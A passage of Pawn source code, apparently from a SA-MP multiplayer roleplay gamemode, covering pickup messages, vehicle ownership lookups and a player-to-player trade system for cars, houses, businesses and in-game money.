	/*else if(pickupid == govp)
	{
	    GameTextForPlayer(playerid, "~w~City Hall", 4000, 1);
	}*/
	else if(pickupid == hitmanep)
	{
	    GameTextForPlayer(playerid, "~w~Hitman Agency", 4000, 1);
	}
	else if(pickupid == rusp)
	{
		GameTextForPlayer(playerid, "~w~Ballas", 4000, 1);
	}
	else if(pickupid == sicp)
	{
		GameTextForPlayer(playerid, "~w~Los Vagos", 4000, 1);
	}
		else if(pickupid == medickase)
	{
		GameTextForPlayer(playerid, "~w~Asansor Pezeshkan\n/elevator2", 4000, 1);
	}
	else if(pickupid == porp)
	{
		GameTextForPlayer(playerid, "~w~Grove Street", 4000, 1);
	}
	else if(pickupid == trdp)
	{
		GameTextForPlayer(playerid, "~w~Los Aztecas", 4000, 1);
	}
	else if(pickupid == taxip)
	{
		GameTextForPlayer(playerid, "~w~Los Santos Taxi", 4000, 1);
	}
	else if(pickupid == gslsenter1)
	{
		SetPlayerPosEx(playerid, 302.3855,-142.1355,1004.0625);
	}
	else if(pickupid == gslsenter2)
	{
		SetPlayerPosEx(playerid, 296.4399,-141.7991,1004.0625);
	}
	else if(pickupid == gslsenter3)
	{
		SetPlayerPosEx(playerid, 308.8968,-141.8929,1004.0625);
	}
	else if(pickupid == gslsenter4)
	{
		SetPlayerPosEx(playerid, 302.3855,-142.1355,1004.0625);
	}
	return 1;
}

stock GetVehicleType(playerid)
{
	new type;
	if(PlayerInfo[playerid][pPcarkey] == OwnedVeh(personalcar[0][playerid]))
	{
	    type = 1;
	}
	else if(PlayerInfo[playerid][pmotokey] == OwnedVeh(personalcar[1][playerid]))
	{
	    type = 2;
	}
	else if(PlayerInfo[playerid][pprcarkey] == OwnedVeh(personalcar[2][playerid]))
	{
	    type = 3;
	}
	else if(PlayerInfo[playerid][pprcarkey2] == OwnedVeh(personalcar[3][playerid]))
	{
	    type = 4;
	}
	else if(PlayerInfo[playerid][pPPluscarkey] == OwnedVeh(personalcar[4][playerid]))
	{
	    type = 5;
	}
	else if(PlayerInfo[playerid][pPPluscarkey2] == OwnedVeh(personalcar[5][playerid]))
	{
	    type = 6;
	}
	else if(PlayerInfo[playerid][pCarkey7] == OwnedVeh(personalcar[6][playerid]))
	{
	    type = 7;
	}
	else if(PlayerInfo[playerid][pCarkey8] == OwnedVeh(personalcar[7][playerid]))
	{
	    type = 8;
	}
	else if(PlayerInfo[playerid][pCarkey9] == OwnedVeh(personalcar[8][playerid]))
	{
	    type = 9;
	}
	else if(PlayerInfo[playerid][pCarkey10] == OwnedVeh(personalcar[9][playerid]))
	{
	    type = 10;
	}
	else if(PlayerInfo[playerid][pCarkey11] == OwnedVeh(personalcar[10][playerid]))
	{
	    type = 11;
	}
	else if(PlayerInfo[playerid][pCarkey12] == OwnedVeh(personalcar[11][playerid]))
	{
	    type = 12;
	}
	else if(PlayerInfo[playerid][pCarkey13] == OwnedVeh(personalcar[12][playerid]))
	{
	    type = 13;
	}
	else if(PlayerInfo[playerid][pCarkey14] == OwnedVeh(personalcar[13][playerid]))
	{
	    type = 14;
	}
	else if(PlayerInfo[playerid][pCarkey15] == OwnedVeh(personalcar[14][playerid]))
	{
	    type = 15;
	}
	return type;
}

forward ValidTuningCar(carid);
public	ValidTuningCar(carid)
{
	if(GetVehicleModel(carid) == 558 || GetVehicleModel(carid) == 565 || GetVehicleModel(carid) == 561 || GetVehicleModel(carid) == 562 || GetVehicleModel(carid) == 559 || GetVehicleModel(carid) == 560)
	{
	    return 1;
	}
	return 0;
}
IsNumeric(const string[])
{
	for (new i = 0, j = strlen(string); i < j; i++)
	{
		if (string[i] > '9' || string[i] < '0') return 0;
	}
	return 1;
}
// SISTEM TRADE
CMD:trade(playerid, params[])
{
	new id;
	if(gPlayerLogged[playerid] == 0) return SCM(playerid, COLOR_ERROR, "You are not logged in.");
	if(sscanf(params, "u", id)) return SCM(playerid, COLOR_SERVER, "/trade [id player]");
	if(!IsPlayerConnected(id)) return SCM(playerid, COLOR_ERROR, "That the Player is not connected.");
	if(!ProxDetectorS(5.0, playerid, id)) return SCM(playerid, COLOR_ERROR, "That the Player is not next to you.");
	if(id == playerid) return SCM(playerid, COLOR_ERROR, "Can not do that.");
	if(in_afacere_cu[playerid] >= 0) return SCM(playerid, COLOR_ERROR, "Already in business.");
	if(in_afacere_cu[id] >= 0) return SCM(playerid, COLOR_ERROR, "You are already in a business");
	if(invitatie_trade[playerid] == id) return SCM(playerid, COLOR_ERROR, "You invited already on that player to a business, waiting for an answer!");
	if(PlayerInfo[playerid][pLevel] < 5 || PlayerInfo[id][pLevel] < 5) return SCM(playerid, COLOR_ERROR, "One of the players does not hold a level 5 in order to be able to start a new business.");
	format(MGLOBAL, sizeof(MGLOBAL), "{0066FF}Trade: {FFFFFF}%s You asked me to a business to accept the use the command/accept trade %d",
	PlayerInfo[playerid][pNormalName],playerid);
	SCM(id, COLOR_SERVER, MGLOBAL);
	format(MGLOBAL, sizeof(MGLOBAL), "{0066FF}Trade: {FFFFFF}u invited on %s at a business, waiting for a response!",PlayerInfo[id][pNormalName]);
	SCM(playerid, COLOR_SERVER, MGLOBAL);
	invitatie_trade[playerid] = id;
	return 1;
}
stock TransferaItem(playerid, id_jucator, tip, id_item)
{
	if(IsPlayerConnected(playerid) && IsPlayerConnected(id_jucator))
	{
		if(tip == 1)
		{
			new reusit = 0;
			if(id_item > 0)
			{
				if(PlayerInfo[id_jucator][pPcarkey] == 0)
				{
					PlayerInfo[id_jucator][pPcarkey] = id_item;
					Update(id_jucator, pPcarkeyx);
					reusit = 1;
				}
				else if(PlayerInfo[id_jucator][pmotokey] == 0)
				{
					PlayerInfo[id_jucator][pmotokey] = id_item;
					Update(id_jucator, pmotokeyx);
					reusit = 1;
				}
				else if(PlayerInfo[id_jucator][pprcarkey] == 0)
				{
					PlayerInfo[id_jucator][pprcarkey] = id_item;
					Update(id_jucator, pprcarkeyx);
					reusit = 1;
				}
				else if(PlayerInfo[id_jucator][pprcarkey2] == 0)
				{
					PlayerInfo[id_jucator][pprcarkey2] = id_item;
					Update(id_jucator, pprcarkey2x);
					reusit = 1;
				}
				else if(PlayerInfo[id_jucator][pPPluscarkey] == 0)
				{
					PlayerInfo[id_jucator][pPPluscarkey] = id_item;
					Update(id_jucator, pPPluscarkeyx);
					reusit = 1;
				}
				else if(PlayerInfo[id_jucator][pPPluscarkey2] == 0)
				{
					PlayerInfo[id_jucator][pPPluscarkey2] = id_item;
					Update(id_jucator, pPPluscarkey2x);
					reusit = 1;
				}
				else if(PlayerInfo[id_jucator][pCarkey7] == 0)
				{
					PlayerInfo[id_jucator][pCarkey7] = id_item;
					Update(id_jucator, pCarkey7x);
					reusit = 1;
				}
				else if(PlayerInfo[id_jucator][pCarkey8] == 0)
				{
					PlayerInfo[id_jucator][pCarkey8] = id_item;
					Update(id_jucator, pCarkey8x);
					reusit = 1;
				}
				else if(PlayerInfo[id_jucator][pCarkey9] == 0)
				{
					PlayerInfo[id_jucator][pCarkey9] = id_item;
					Update(id_jucator, pCarkey9x);
					reusit = 1;
				}
				else if(PlayerInfo[id_jucator][pCarkey10] == 0)
				{
					PlayerInfo[id_jucator][pCarkey10] = id_item;
					Update(id_jucator, pCarkey10x);
					reusit = 1;
				}
				else if(PlayerInfo[id_jucator][pCarkey11] == 0)
				{
					PlayerInfo[id_jucator][pCarkey11] = id_item;
					Update(id_jucator, pCarkey11x);
					reusit = 1;
				}
				else if(PlayerInfo[id_jucator][pCarkey12] == 0)
				{
					PlayerInfo[id_jucator][pCarkey12] = id_item;
					Update(id_jucator, pCarkey12x);
					reusit = 1;
				}
				else if(PlayerInfo[id_jucator][pCarkey13] == 0)
				{
					PlayerInfo[id_jucator][pCarkey13] = id_item;
					Update(id_jucator, pCarkey13x);
					reusit = 1;
				}
				else if(PlayerInfo[id_jucator][pCarkey14] == 0)
				{
					PlayerInfo[id_jucator][pCarkey14] = id_item;
					Update(id_jucator, pCarkey14x);
					reusit = 1;
				}
				else if(PlayerInfo[id_jucator][pCarkey15] == 0)
				{
					PlayerInfo[id_jucator][pCarkey15] = id_item;
					Update(id_jucator, pCarkey15x);
					reusit = 1;
				}
				if(reusit > 0)
				{
					format(MGLOBAL, sizeof(MGLOBAL), "{0066FF}Trade: {FFFFFF}The vehicle %s has been received by the %s", aVehicleNames[CarInfo[id_item][cModel]-400],PlayerInfo[id_jucator][pNormalName]);
					SCM(playerid, COLOR_SERVER, MGLOBAL);
					format(MGLOBAL, sizeof(MGLOBAL), "{0066FF}Trade: {FFFFFF}You have received the vehicle from %s", aVehicleNames[CarInfo[id_item][cModel]-400],PlayerInfo[playerid][pNormalName]);
					SCM(id_jucator, COLOR_SERVER, MGLOBAL);
					strmid(CarInfo[id_item][cOwner], PlayerInfo[id_jucator][pNormalName], 0, strlen(PlayerInfo[playerid][pNormalName]), 255);
					vUpdate(id_item,cOwnerx);
					new gasit = 0;
					for(new id_masina = 0; id_masina < 15; id_masina++)
					{
						if(gasit == 0)
						{
							if(OwnedVeh(personalcar[id_masina][playerid]) == id_item)
							{ DestroyVehicle(personalcar[id_masina][playerid]); personalcar[id_masina][playerid] = -1; DespawnCar[playerid][id_masina] = -1; gasit = 1; }
						}
					}
				}
			}
		}
		if(tip == 2)
		{
			if(id_item != 999)
			{
				new sqlupdate[512];
				PlayerInfo[id_jucator][pPhousekey] = id_item;
				Update(id_jucator, pPhousekeyx);
				strmid(HouseInfo[id_item][hOwner], PlayerInfo[id_jucator][pNormalName], 0, 25, 999);
				mysql_format(SQL,sqlupdate,sizeof(sqlupdate),"UPDATE `houses` SET `Owner`='%s' WHERE `ID`='%d'",HouseInfo[id_item][hOwner],id_item);
				mysql_tquery(SQL,sqlupdate,"","");
				OnPropTextdrawUpdate(1,id_item);
				format(MGLOBAL, sizeof(MGLOBAL), "{0066FF}Trade: {FFFFFF}The house (ID: %d) has been received by %s", id_item,PlayerInfo[id_jucator][pNormalName]);
				SCM(playerid, COLOR_SERVER, MGLOBAL);
				format(MGLOBAL, sizeof(MGLOBAL), "{0066FF}Trade: {FFFFFF}You have received the house (ID: %d) from %s",id_item,PlayerInfo[playerid][pNormalName]);
				SCM(id_jucator, COLOR_SERVER, MGLOBAL);
			}	
		}
		if(tip == 3)
		{
			if(id_item != 255)
			{
				new sqlupdate[512];
				PlayerInfo[id_jucator][pPbiskey] = id_item;
				Update(id_jucator, pPbiskeyx);
				strmid(BizzInfo[id_item][bOwner], PlayerInfo[id_jucator][pNormalName], 0, 25, 999);
				mysql_format(SQL,sqlupdate,sizeof(sqlupdate),"UPDATE `bizz` SET `Owner`='%s' WHERE `ID`='%d'",BizzInfo[id_item][bOwner],id_item);
				mysql_tquery(SQL,sqlupdate,"","");
				OnPropTextdrawUpdate(2,id_item);
				format(MGLOBAL, sizeof(MGLOBAL), "{0066FF}Trade: {FFFFFF}The business (ID: %d) has been received by %s", id_item,PlayerInfo[id_jucator][pNormalName]);
				SCM(playerid, COLOR_SERVER, MGLOBAL);
				format(MGLOBAL, sizeof(MGLOBAL), "{0066FF}Trade: {FFFFFF}You have received your business (ID: %d) from %s",id_item,PlayerInfo[playerid][pNormalName]);
				SCM(id_jucator, COLOR_SERVER, MGLOBAL);
			}	
		}
		if(tip == 4)
		{
			if(id_item <= 500000000)
			{
				GivePlayerCash(id_jucator, id_item);
				Update(playerid, pCashx);
				format(MGLOBAL, sizeof(MGLOBAL), "{0066FF}Trade: {FFFFFF}Money ($%s) were received by %s", FormatNumber(id_item),PlayerInfo[id_jucator][pNormalName]);
				SCM(playerid, COLOR_SERVER, MGLOBAL);
				format(MGLOBAL, sizeof(MGLOBAL), "{0066FF}Trade: {FFFFFF}You have received money ($%s) from %s",FormatNumber(id_item),PlayerInfo[playerid][pNormalName]);
				SCM(id_jucator, COLOR_SERVER, MGLOBAL);
			}
		}
	}
	else
	{
		Afacere(playerid, id_jucator, false);
	}
	return 1;
}
stock StergeIteme(playerid, id_invitat)
{
	if(IsPlayerConnected(playerid) && IsPlayerConnected(id_invitat))
	{
		new culoare_trade[128];
		pregatit_trade[playerid] = 0;
		suma_bani_trade[playerid] = 0;
		iteme_adaugate[playerid] = 0;
		for(new i = 0; i < 15; i++) vehicule[i][playerid] = 0;
		casa_trade[playerid] = 0;
		afacere_trade[playerid] = 0;
		if(partitie_trade[playerid] == 1)
		{
			new id_td, id_td2;
			format(MGLOBAL, sizeof(MGLOBAL), "%s~n~~r~Prepared",PlayerInfo[playerid][pNormalName]);
			PlayerTextDrawSetString(playerid , TradeTD[4], MGLOBAL);PlayerTextDrawShow(playerid, TradeTD[4]);
			PlayerTextDrawSetString(id_invitat , TradeTD[4], MGLOBAL);PlayerTextDrawShow(id_invitat, TradeTD[4]);
			if(pregatit_trade[id_invitat] == 0) { culoare_trade = "~r~"; }
			if(pregatit_trade[id_invitat] == 1) { culoare_trade = "~g~"; }
			format(MGLOBAL, sizeof(MGLOBAL), "%s~n~%Prepared",PlayerInfo[id_invitat][pNormalName],culoare_trade);
			PlayerTextDrawSetString(playerid , TradeTD[5], MGLOBAL);PlayerTextDrawShow(playerid, TradeTD[5]);
			PlayerTextDrawSetString(id_invitat , TradeTD[5], MGLOBAL);PlayerTextDrawShow(id_invitat, TradeTD[5]);
			id_td = 10,id_td2 = 11;PlayerTextDrawHide(playerid, TradeTD[id_td2]);PlayerTextDrawHide(id_invitat, TradeTD[id_td2]);PlayerTextDrawHide(playerid, TradeTD[id_td]);PlayerTextDrawHide(id_invitat, TradeTD[id_td]);
			id_td = 13,id_td2 = 12;PlayerTextDrawHide(playerid, TradeTD[id_td2]);PlayerTextDrawHide(id_invitat, TradeTD[id_td2]);PlayerTextDrawHide(playerid, TradeTD[id_td]);PlayerTextDrawHide(id_invitat, TradeTD[id_td]);
			id_td = 15,id_td2 = 14;PlayerTextDrawHide(playerid, TradeTD[id_td2]);PlayerTextDrawHide(id_invitat, TradeTD[id_td2]);PlayerTextDrawHide(playerid, TradeTD[id_td]);PlayerTextDrawHide(id_invitat, TradeTD[id_td]);
			id_td = 17,id_td2 = 16;PlayerTextDrawHide(playerid, TradeTD[id_td2]);PlayerTextDrawHide(id_invitat, TradeTD[id_td2]);PlayerTextDrawHide(playerid, TradeTD[id_td]);PlayerTextDrawHide(id_invitat, TradeTD[id_td]);
			id_td = 20,id_td2 = 18;PlayerTextDrawHide(playerid, TradeTD[id_td2]);PlayerTextDrawHide(id_invitat, TradeTD[id_td2]);PlayerTextDrawHide(playerid, TradeTD[id_td]);PlayerTextDrawHide(id_invitat, TradeTD[id_td]);
			id_td = 21,id_td2 = 19;PlayerTextDrawHide(playerid, TradeTD[id_td2]);PlayerTextDrawHide(id_invitat, TradeTD[id_td2]);PlayerTextDrawHide(playerid, TradeTD[id_td]);PlayerTextDrawHide(id_invitat, TradeTD[id_td]);
			id_td = 23,id_td2 = 22;PlayerTextDrawHide(playerid, TradeTD[id_td2]);PlayerTextDrawHide(id_invitat, TradeTD[id_td2]);PlayerTextDrawHide(playerid, TradeTD[id_td]);PlayerTextDrawHide(id_invitat, TradeTD[id_td]);
		}
		if(partitie_trade[playerid] == 2)
		{
			new id_td, id_td2;
			format(MGLOBAL, sizeof(MGLOBAL), "%s~n~~r~Prepared",PlayerInfo[playerid][pNormalName]);
			PlayerTextDrawSetString(playerid , TradeTD[5], MGLOBAL);PlayerTextDrawShow(playerid, TradeTD[5]);
			PlayerTextDrawSetString(id_invitat , TradeTD[5], MGLOBAL);PlayerTextDrawShow(id_invitat, TradeTD[5]);
			if(pregatit_trade[id_invitat] == 0) { culoare_trade = "~r~"; }
			if(pregatit_trade[id_invitat] == 1) { culoare_trade = "~g~"; }
			format(MGLOBAL, sizeof(MGLOBAL), "%s~n~%sPrepared",PlayerInfo[id_invitat][pNormalName],culoare_trade);
			PlayerTextDrawSetString(playerid , TradeTD[4], MGLOBAL);PlayerTextDrawShow(playerid, TradeTD[4]);
			PlayerTextDrawSetString(id_invitat , TradeTD[4], MGLOBAL);PlayerTextDrawShow(id_invitat, TradeTD[4]);
			id_td = 25,id_td2 = 24;PlayerTextDrawHide(playerid, TradeTD[id_td2]);PlayerTextDrawHide(id_invitat, TradeTD[id_td2]);PlayerTextDrawHide(playerid, TradeTD[id_td]);PlayerTextDrawHide(id_invitat, TradeTD[id_td]);
			id_td = 32,id_td2 = 26;PlayerTextDrawHide(playerid, TradeTD[id_td2]);PlayerTextDrawHide(id_invitat, TradeTD[id_td2]);PlayerTextDrawHide(playerid, TradeTD[id_td]);PlayerTextDrawHide(id_invitat, TradeTD[id_td]);
			id_td = 33,id_td2 = 27;PlayerTextDrawHide(playerid, TradeTD[id_td2]);PlayerTextDrawHide(id_invitat, TradeTD[id_td2]);PlayerTextDrawHide(playerid, TradeTD[id_td]);PlayerTextDrawHide(id_invitat, TradeTD[id_td]);
			id_td = 34,id_td2 = 28;PlayerTextDrawHide(playerid, TradeTD[id_td2]);PlayerTextDrawHide(id_invitat, TradeTD[id_td2]);PlayerTextDrawHide(playerid, TradeTD[id_td]);PlayerTextDrawHide(id_invitat, TradeTD[id_td]);
			id_td = 35,id_td2 = 29;PlayerTextDrawHide(playerid, TradeTD[id_td2]);PlayerTextDrawHide(id_invitat, TradeTD[id_td2]);PlayerTextDrawHide(playerid, TradeTD[id_td]);PlayerTextDrawHide(id_invitat, TradeTD[id_td]);
			id_td = 36,id_td2 = 30;PlayerTextDrawHide(playerid, TradeTD[id_td2]);PlayerTextDrawHide(id_invitat, TradeTD[id_td2]);PlayerTextDrawHide(playerid, TradeTD[id_td]);PlayerTextDrawHide(id_invitat, TradeTD[id_td]);
			id_td = 37,id_td2 = 31;PlayerTextDrawHide(playerid, TradeTD[id_td2]);PlayerTextDrawHide(id_invitat, TradeTD[id_td2]);PlayerTextDrawHide(playerid, TradeTD[id_td]);PlayerTextDrawHide(id_invitat, TradeTD[id_td]);
		}
	}
	else
	{
		Afacere(playerid, id_invitat, false);
	}
	return 1;
}
stock AdaugaItem(playerid, id_invitat, tip, id_item)
{
	if(IsPlayerConnected(playerid) && IsPlayerConnected(id_invitat))
	{
		if(iteme_adaugate[playerid] < 7)
		{
			if(tip > 0)
			{
				if(partitie_trade[playerid] == 1)
				{
					new id_td,id_td2;
					iteme_adaugate[playerid]++;
					if(iteme_adaugate[playerid] == 1) id_td = 10,id_td2 = 11;
					if(iteme_adaugate[playerid] == 2) id_td = 13,id_td2 = 12;
					if(iteme_adaugate[playerid] == 3) id_td = 15,id_td2 = 14;
					if(iteme_adaugate[playerid] == 4) id_td = 17,id_td2 = 16;
					if(iteme_adaugate[playerid] == 5) id_td = 20,id_td2 = 18;
					if(iteme_adaugate[playerid] == 6) id_td = 21,id_td2 = 19;
					if(iteme_adaugate[playerid] == 7) id_td = 23,id_td2 = 22;
					if(tip == 1)
					{
						PlayerTextDrawSetPreviewRot(playerid, TradeTD[id_td2], 0.000000, 0.000000, 320.000000, 1.000000),PlayerTextDrawSetPreviewRot(id_invitat, TradeTD[id_td2], 0.000000, 0.000000, 320.000000, 1.000000);
						format(MGLOBAL, sizeof(MGLOBAL), "%s_(KM:_%.0f,_Vechime:_%d_zile)",aVehicleNames[CarInfo[id_item][cModel]-400],CarInfo[id_item][cKM],CarInfo[id_item][cDays]);
						PlayerTextDrawSetString(playerid, TradeTD[id_td], MGLOBAL),PlayerTextDrawSetString(id_invitat, TradeTD[id_td], MGLOBAL);
						PlayerTextDrawShow(playerid, TradeTD[id_td]),PlayerTextDrawShow(id_invitat, TradeTD[id_td]);
						PlayerTextDrawSetPreviewModel(playerid, TradeTD[id_td2], CarInfo[id_item][cModel]),PlayerTextDrawSetPreviewModel(id_invitat, TradeTD[id_td2], CarInfo[id_item][cModel]);
						PlayerTextDrawSetPreviewVehCol(playerid, TradeTD[id_td2], CarInfo[id_item][cColorOne], CarInfo[id_item][cColorTwo]),PlayerTextDrawSetPreviewVehCol(id_invitat, TradeTD[id_td2], CarInfo[id_item][cColorOne], CarInfo[id_item][cColorTwo]);
						PlayerTextDrawShow(playerid, TradeTD[id_td2]),PlayerTextDrawShow(id_invitat, TradeTD[id_td2]);
					}
					if(tip == 2)
					{
						PlayerTextDrawSetPreviewRot(playerid, TradeTD[id_td2], 0.000000, 0.000000, 320.000000, 1.000000),PlayerTextDrawSetPreviewRot(id_invitat, TradeTD[id_td2], 0.000000, 0.000000, 320.000000, 1.000000);
						format(MGLOBAL, sizeof(MGLOBAL), "CASA_ID:_%d",id_item);
						PlayerTextDrawSetString(playerid, TradeTD[id_td], MGLOBAL),PlayerTextDrawSetString(id_invitat, TradeTD[id_td], MGLOBAL);
						PlayerTextDrawShow(playerid, TradeTD[id_td]),PlayerTextDrawShow(id_invitat, TradeTD[id_td]);
						PlayerTextDrawSetPreviewModel(playerid, TradeTD[id_td2], 1273),PlayerTextDrawSetPreviewModel(id_invitat, TradeTD[id_td2], 1273);
						PlayerTextDrawShow(playerid, TradeTD[id_td2]),PlayerTextDrawShow(id_invitat, TradeTD[id_td2]);
					}
					if(tip == 3)
					{
						PlayerTextDrawSetPreviewRot(playerid, TradeTD[id_td2], 0.000000, 0.000000, 320.000000, 1.000000),PlayerTextDrawSetPreviewRot(id_invitat, TradeTD[id_td2], 0.000000, 0.000000, 320.000000, 1.000000);
						format(MGLOBAL, sizeof(MGLOBAL), "Afacere_ID:_%d",id_item);
						PlayerTextDrawSetString(playerid, TradeTD[id_td], MGLOBAL),PlayerTextDrawSetString(id_invitat, TradeTD[id_td], MGLOBAL);
						PlayerTextDrawShow(playerid, TradeTD[id_td]),PlayerTextDrawShow(id_invitat, TradeTD[id_td]);
						PlayerTextDrawSetPreviewModel(playerid, TradeTD[id_td2], 1274),PlayerTextDrawSetPreviewModel(id_invitat, TradeTD[id_td2], 1274);
						PlayerTextDrawShow(playerid, TradeTD[id_td2]),PlayerTextDrawShow(id_invitat, TradeTD[id_td2]);
						
					}
					if(tip == 4)
					{
						PlayerTextDrawSetPreviewRot(playerid, TradeTD[id_td2], 90.000000, 0.000000, 90.000000, 1.000000),PlayerTextDrawSetPreviewRot(id_invitat, TradeTD[id_td2], 90.000000, 0.000000, 90.000000, 1.000000);
						format(MGLOBAL, sizeof(MGLOBAL), "$%s",FormatNumber(id_item));
						PlayerTextDrawSetString(playerid, TradeTD[id_td], MGLOBAL),PlayerTextDrawSetString(id_invitat, TradeTD[id_td], MGLOBAL);
						PlayerTextDrawShow(playerid, TradeTD[id_td]),PlayerTextDrawShow(id_invitat, TradeTD[id_td]);
						PlayerTextDrawSetPreviewModel(playerid, TradeTD[id_td2], 1212),PlayerTextDrawSetPreviewModel(id_invitat, TradeTD[id_td2], 1212);
						PlayerTextDrawShow(playerid, TradeTD[id_td2]),PlayerTextDrawShow(id_invitat, TradeTD[id_td2]);
						
					}
				}
				if(partitie_trade[playerid] == 2)
				{	
					new id_td,id_td2;
					iteme_adaugate[playerid]++;
					if(iteme_adaugate[playerid] == 1) id_td = 25,id_td2 = 24;
					if(iteme_adaugate[playerid] == 2) id_td = 32,id_td2 = 26;
					if(iteme_adaugate[playerid] == 3) id_td = 33,id_td2 = 27;
					if(iteme_adaugate[playerid] == 4) id_td = 34,id_td2 = 28;
					if(iteme_adaugate[playerid] == 5) id_td = 35,id_td2 = 29;
					if(iteme_adaugate[playerid] == 6) id_td = 36,id_td2 = 30;
					if(iteme_adaugate[playerid] == 7) id_td = 37,id_td2 = 31;
					if(tip == 1)
					{
						PlayerTextDrawSetPreviewRot(playerid, TradeTD[id_td2], 0.000000, 0.000000, 320.000000, 1.000000),PlayerTextDrawSetPreviewRot(id_invitat, TradeTD[id_td2], 0.000000, 0.000000, 320.000000, 1.000000);
						format(MGLOBAL, sizeof(MGLOBAL), "%s_(KM:_%.0f,_Vechime:_%d_zile)",aVehicleNames[CarInfo[id_item][cModel]-400],CarInfo[id_item][cKM],CarInfo[id_item][cDays]);
						PlayerTextDrawSetString(playerid, TradeTD[id_td], MGLOBAL),PlayerTextDrawSetString(id_invitat, TradeTD[id_td], MGLOBAL);
						PlayerTextDrawShow(playerid, TradeTD[id_td]),PlayerTextDrawShow(id_invitat, TradeTD[id_td]);
						PlayerTextDrawSetPreviewModel(playerid, TradeTD[id_td2], CarInfo[id_item][cModel]),PlayerTextDrawSetPreviewModel(id_invitat, TradeTD[id_td2], CarInfo[id_item][cModel]);
						PlayerTextDrawSetPreviewVehCol(playerid, TradeTD[id_td2], CarInfo[id_item][cColorOne], CarInfo[id_item][cColorTwo]),PlayerTextDrawSetPreviewVehCol(id_invitat, TradeTD[id_td2], CarInfo[id_item][cColorOne], CarInfo[id_item][cColorTwo]);
						PlayerTextDrawShow(playerid, TradeTD[id_td2]),PlayerTextDrawShow(id_invitat, TradeTD[id_td2]);
					}
					if(tip == 2)
					{
						PlayerTextDrawSetPreviewRot(playerid, TradeTD[id_td2], 0.000000, 0.000000, 320.000000, 1.000000),PlayerTextDrawSetPreviewRot(id_invitat, TradeTD[id_td2], 0.000000, 0.000000, 320.000000, 1.000000);
						format(MGLOBAL, sizeof(MGLOBAL), "CASA_ID:_%d",id_item);
						PlayerTextDrawSetString(playerid, TradeTD[id_td], MGLOBAL),PlayerTextDrawSetString(id_invitat, TradeTD[id_td], MGLOBAL);
						PlayerTextDrawShow(playerid, TradeTD[id_td]),PlayerTextDrawShow(id_invitat, TradeTD[id_td]);
						PlayerTextDrawSetPreviewModel(playerid, TradeTD[id_td2], 1273),PlayerTextDrawSetPreviewModel(id_invitat, TradeTD[id_td2], 1273);
						PlayerTextDrawShow(playerid, TradeTD[id_td2]),PlayerTextDrawShow(id_invitat, TradeTD[id_td2]);
					}
					if(tip == 3)
					{
						PlayerTextDrawSetPreviewRot(playerid, TradeTD[id_td2], 0.000000, 0.000000, 320.000000, 1.000000),PlayerTextDrawSetPreviewRot(id_invitat, TradeTD[id_td2], 0.000000, 0.000000, 320.000000, 1.000000);
						format(MGLOBAL, sizeof(MGLOBAL), "Afacere_ID:_%d",id_item);
						PlayerTextDrawSetString(playerid, TradeTD[id_td], MGLOBAL),PlayerTextDrawSetString(id_invitat, TradeTD[id_td], MGLOBAL);
						PlayerTextDrawShow(playerid, TradeTD[id_td]),PlayerTextDrawShow(id_invitat, TradeTD[id_td]);
						PlayerTextDrawSetPreviewModel(playerid, TradeTD[id_td2], 1274),PlayerTextDrawSetPreviewModel(id_invitat, TradeTD[id_td2], 1274);
						PlayerTextDrawShow(playerid, TradeTD[id_td2]),PlayerTextDrawShow(id_invitat, TradeTD[id_td2]);
					}
					if(tip == 4)
					{
						PlayerTextDrawSetPreviewRot(playerid, TradeTD[id_td2], 90.000000, 0.000000, 90.000000, 1.000000),PlayerTextDrawSetPreviewRot(id_invitat, TradeTD[id_td2], 90.000000, 0.000000, 90.000000, 1.000000);
						format(MGLOBAL, sizeof(MGLOBAL), "$%s",FormatNumber(id_item));
						PlayerTextDrawSetString(playerid, TradeTD[id_td], MGLOBAL),PlayerTextDrawSetString(id_invitat, TradeTD[id_td], MGLOBAL);
						PlayerTextDrawShow(playerid, TradeTD[id_td]),PlayerTextDrawShow(id_invitat, TradeTD[id_td]);
						PlayerTextDrawSetPreviewModel(playerid, TradeTD[id_td2], 1212),PlayerTextDrawSetPreviewModel(id_invitat, TradeTD[id_td2], 1212);
						PlayerTextDrawShow(playerid, TradeTD[id_td2]),PlayerTextDrawShow(id_invitat, TradeTD[id_td2]);
						
					}
				}
			}
		}
		else return SCM(playerid, COLOR_ERROR, "You've reached the maximum of items added.");
	}
	else
	{
		Afacere(playerid, id_invitat, false);
	}
	return 1;
}
stock Afacere(playerid, id_invitat, bool:status)
{
	if(status == true)
	{
		if(IsPlayerConnected(playerid) && IsPlayerConnected(id_invitat))
		{
			pregatit_trade[playerid] = 0, pregatit_trade[id_invitat] = 0;
			suma_bani_trade[playerid] = 0, suma_bani_trade[id_invitat] = 0;
			partitie_trade[playerid] = 1, partitie_trade[id_invitat] = 2;
			iteme_adaugate[playerid] = 0,iteme_adaugate[id_invitat] = 0;
			PlayerTextDrawSetPreviewModel(playerid, TradeTD[2], PlayerInfo[playerid][pModel]);
			PlayerTextDrawSetPreviewModel(id_invitat, TradeTD[2], PlayerInfo[playerid][pModel]);
			PlayerTextDrawSetPreviewModel(playerid, TradeTD[3], PlayerInfo[id_invitat][pModel]);
			PlayerTextDrawSetPreviewModel(id_invitat, TradeTD[3], PlayerInfo[id_invitat][pModel]);
			for(new i = 0; i < 15; i++) vehicule[i][playerid] = 0,vehicule[i][id_invitat] = 0;
			casa_trade[playerid] = 0,casa_trade[id_invitat] = 0;
			afacere_trade[playerid] = 0,afacere_trade[id_invitat] = 0;
			in_afacere_cu[playerid] = id_invitat,in_afacere_cu[id_invitat] = playerid;
			format(MGLOBAL, sizeof(MGLOBAL), "%s~n~~r~Prepared",PlayerInfo[playerid][pNormalName]);
			PlayerTextDrawSetString(playerid , TradeTD[4], MGLOBAL);
			PlayerTextDrawSetString(id_invitat , TradeTD[4], MGLOBAL);
			format(MGLOBAL, sizeof(MGLOBAL), "%s~n~~r~Prepared",PlayerInfo[id_invitat][pNormalName]);
			PlayerTextDrawSetString(playerid , TradeTD[5], MGLOBAL);
			PlayerTextDrawSetString(id_invitat , TradeTD[5], MGLOBAL);
			for(new i = 0; i < sizeof(TradeTD); i++) PlayerTextDrawShow(playerid, TradeTD[i]),PlayerTextDrawShow(id_invitat, TradeTD[i]);
			SelectTextDraw(playerid, 0xFF000000FF),SelectTextDraw(id_invitat, 0xFF000000FF);
			new id_textdraw = 10;
			PlayerTextDrawHide(playerid, TradeTD[id_textdraw]),PlayerTextDrawHide(id_invitat, TradeTD[id_textdraw]),id_textdraw++;
